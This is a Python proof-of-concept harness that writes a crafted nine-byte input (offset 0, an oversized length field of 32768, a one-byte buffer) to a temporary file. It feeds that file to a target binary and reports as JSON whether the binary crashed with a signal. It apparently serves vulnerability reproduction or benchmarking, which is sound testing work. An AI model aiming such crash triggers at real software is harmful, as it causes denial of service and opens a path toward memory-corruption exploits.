#!/usr/bin/env python3

import argparse
import json
import signal
import subprocess
import sys
import tempfile
import time
from pathlib import Path


TRIGGER_START = 0
TRIGGER_SIZE = 32768
CALLER_BUFFER = b"A"


def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("--binary", required=True)
    parser.add_argument("--json-out")
    parser.add_argument("--timeout", type=float, default=30.0)
    return parser.parse_args()


def decode_output(output):
    if output is None:
        return ""
    if isinstance(output, str):
        return output
    return output.decode("utf-8", errors="replace")


def signal_name(returncode):
    if returncode is None or returncode >= 0:
        return None
    try:
        return signal.Signals(-returncode).name
    except ValueError:
        return f"signal {-returncode}"


def build_result(binary, command, returncode, timed_out, runtime_ms, stdout, stderr, error):
    signal_name_value = signal_name(returncode)

    if returncode is not None and returncode < 0:
        observable = {
            "kind": "crash_trace",
            "value": f"returncode={returncode};signal={signal_name_value}",
            "path": None,
        }
    elif timed_out:
        observable = {
            "kind": "custom",
            "value": "timeout",
            "path": None,
        }
    else:
        observable = {
            "kind": "stdout",
            "value": " ".join(stdout.splitlines()),
            "path": None,
        }

    return {
        "binary": binary,
        "command": command,
        "returncode": returncode,
        "signal": signal_name_value,
        "timed_out": timed_out,
        "runtime_ms": runtime_ms,
        "stdout": stdout,
        "stderr": stderr,
        "observable": observable,
        "error": error,
    }


def main():
    arguments = parse_arguments()
    payload = (
        TRIGGER_START.to_bytes(4, "little", signed=True)
        + TRIGGER_SIZE.to_bytes(4, "little", signed=True)
        + CALLER_BUFFER
    )

    start_time = time.monotonic()
    returncode = None
    timed_out = False
    stdout = ""
    stderr = ""
    error = None
    command = None

    try:
        with tempfile.NamedTemporaryFile(prefix="s7dl-trigger-") as trigger_file:
            trigger_file.write(payload)
            trigger_file.flush()
            command = [arguments.binary, trigger_file.name]
            completed = subprocess.run(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=arguments.timeout,
                check=False,
            )
            returncode = completed.returncode
            stdout = decode_output(completed.stdout)
            stderr = decode_output(completed.stderr)
    except subprocess.TimeoutExpired as exception:
        timed_out = True
        stdout = decode_output(exception.stdout)
        stderr = decode_output(exception.stderr)
        error = f"target timed out after {arguments.timeout:g} seconds"
    except (OSError, ValueError) as exception:
        error = f"failed to execute target: {exception}"

    runtime_ms = int((time.monotonic() - start_time) * 1000)
    if error is None and (returncode is None or returncode >= 0):
        error = "target did not terminate with a signal"

    result = build_result(
        arguments.binary,
        command,
        returncode,
        timed_out,
        runtime_ms,
        stdout,
        stderr,
        error,
    )

    if arguments.json_out:
        try:
            output_path = Path(arguments.json_out)
            output_path.parent.mkdir(parents=True, exist_ok=True)
            output_path.write_text(
                json.dumps(result, indent=2) + "\n",
                encoding="utf-8",
            )
        except OSError as exception:
            result["error"] = f"failed to write JSON output: {exception}"

    json.dump(result, sys.stdout, indent=2)
    sys.stdout.write("\n")


if __name__ == "__main__":
    main()
